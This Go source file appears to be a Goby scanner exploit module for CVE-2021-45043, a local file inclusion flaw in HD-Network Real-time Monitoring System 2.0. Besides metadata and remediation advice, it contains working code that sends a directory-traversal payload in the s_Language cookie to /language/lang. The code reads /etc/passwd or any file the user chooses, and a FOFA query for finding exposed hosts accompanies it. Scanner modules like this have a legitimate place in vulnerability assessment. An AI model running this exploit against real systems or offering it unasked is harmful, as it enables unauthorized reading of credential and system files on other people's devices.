package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "HD-Network Real-time Monitoring System 2.0 Local File Inclusion (CVE-2021-45043)",
    "Description": "<p>HD-Network Real-time Monitoring System 2.0 is a real-time network monitoring product.</p><p>HD-Network Real-time Monitoring System 2.0 has a local file inclusion (LFI) vulnerability. Attackers can obtain sensitive user information such as passwords to further control the system.</p>",
    "Impact": "HD-Network Real-time Monitoring System 2.0 Local File Inclusion (CVE-2021-45043)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.zkteco.com\">https://www.zkteco.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "HD-Network Real-time Monitoring System 2.0",
    "VulType": [
        "File Inclusion"
    ],
    "Tags": [
        "File Inclusion"
    ],
    "Translation": {
        "CN": {
            "Name": "HD-Network Real-time Monitoring System 2.0 本地文件包含漏洞（CVE-2021-45043）",
            "Description": "<p>HD-Network Real-time Monitoring System 2.0 是一款实时的网络监控产品。</p><p>HD-Network Real-time Monitoring System 2.0 存在本地文件包含 (LFI) 漏洞，攻击者可获取密码等用户敏感信息进一步控制系统。</p>",
            "Impact": "<p>HD-Network Real-time Monitoring System 2.0 存在本地文件包含 (LFI) 漏洞，攻击者可获取密码等用户敏感信息进一步控制系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.zkteco.com\">https://www.zkteco.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "HD-Network Real-time Monitoring System 2.0",
            "VulType": [
                "文件包含"
            ],
            "Tags": [
                "文件包含"
            ]
        },
        "EN": {
            "Name": "HD-Network Real-time Monitoring System 2.0 Local File Inclusion (CVE-2021-45043)",
            "Description": "<p>HD-Network Real-time Monitoring System 2.0 is a real-time network monitoring product.</p><p>HD-Network Real-time Monitoring System 2.0 has a local file inclusion (LFI) vulnerability. Attackers can obtain sensitive user information such as passwords to further control the system.</p>",
            "Impact": "HD-Network Real-time Monitoring System 2.0 Local File Inclusion (CVE-2021-45043)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.zkteco.com\">https://www.zkteco.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "HD-Network Real-time Monitoring System 2.0",
            "VulType": [
                "File Inclusion"
            ],
            "Tags": [
                "File Inclusion"
            ]
        }
    },
    "FofaQuery": "body=\"zkt_input_s\"",
    "GobyQuery": "body=\"zkt_input_s\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.zkteco.com",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-45043.yaml"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [
        "CVE-2021-45043"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202112-1339"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "../../../../../../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10247"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/language/lang"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Referer", u.FixedHostInfo)
			cfg.Header.Store("Cookie", "s_asptitle=HD-Network%20Real-time%20Monitoring%20System%20V2.0; s_Language=../../../../../../../../../../../../../../etc/passwd; s_browsertype=2; s_ip=; s_port=; s_channum=; s_loginhandle=; s_httpport=; s_sn=; s_type=; s_devtype=")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && regexp.MustCompile("root:(.*?):0:0:").MatchString(resp.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/language/lang"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Referer", expResult.HostInfo.FixedHostInfo)
			cfg.Header.Store("Cookie", fmt.Sprintf("s_asptitle=HD-Network%%20Real-time%%20Monitoring%%20System%%20V2.0; s_Language=%s; s_browsertype=2; s_ip=; s_port=; s_channum=; s_loginhandle=; s_httpport=; s_sn=; s_type=; s_devtype=", cmd))
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
